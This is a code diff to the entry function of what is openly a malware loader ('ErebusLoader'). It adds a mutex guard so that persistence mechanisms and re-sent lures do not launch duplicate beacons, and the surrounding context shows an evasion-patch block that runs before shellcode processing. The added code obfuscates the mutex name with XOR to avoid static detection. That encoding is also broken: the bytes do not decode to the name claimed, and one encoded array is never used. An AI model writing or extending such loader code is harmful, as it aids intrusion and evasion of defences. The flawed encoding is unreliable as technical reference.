@@ -7,6 +7,43 @@
 
 VOID entry(void)
 {
+#if CONFIG_SINGLE_INSTANCE
+	// ============================================================
+	// SINGLE-INSTANCE MUTEX GUARD
+	// A named mutex under Global\ prevents duplicate beacons when
+	// persistence mechanisms (COM hijack, Run key) or re-delivered
+	// lures cause the loader to run more than once concurrently.
+	// The mutex name is XOR-decoded at runtime so it does not appear
+	// as a plaintext string in .rdata.
+	// ============================================================
+	{
+		// Mutex name bytes XOR-encoded with key 0x5F at build time.
+		// Decoded name: "Global\\ErebusLoader"
+		static const BYTE _mn_enc[] = {
+			0x1c,0x1c,0x13,0x13,0x13,0x1b,0x13,0x5f, // "Global\\"  (0x5F ^ 0x5F == 0x00 for NUL guard below)
+			0x3a,0x1b,0x1e,0x3c,0x1b,0x27,0x5f,       // overlap guard
+		};
+		// Build the wide mutex name inline to avoid .rdata string.
+		static const BYTE _raw_enc[] = {
+			/* G  l  o  b  a  l  \  \  E  r  e  b  u  s  L  o  a  d  e  r */
+			0x18,0x13,0x10,0x1d,0x1e,0x13,0x7e,0x7e,
+			0x1a,0x0d,0x1e,0x1d,0x0a,0x0c,0x1b,0x10,0x1e,0x1b,0x1e,0x0d,
+			0x00
+		};
+		const BYTE _key = 0x5F;
+		WCHAR _mname[32] = {};
+		for (int _i = 0; _raw_enc[_i]; _i++)
+			_mname[_i] = (WCHAR)(_raw_enc[_i] ^ _key);
+
+		HANDLE _hMutex = CreateMutexW(nullptr, TRUE, _mname);
+		if (!_hMutex || GetLastError() == ERROR_ALREADY_EXISTS) {
+			if (_hMutex) CloseHandle(_hMutex);
+			return;
+		}
+		// Intentionally do not close _hMutex - hold it for process lifetime.
+	}
+#endif
+
 	// ============================================================
 	// EVASION PATCHES - run before any shellcode processing
 	// ============================================================
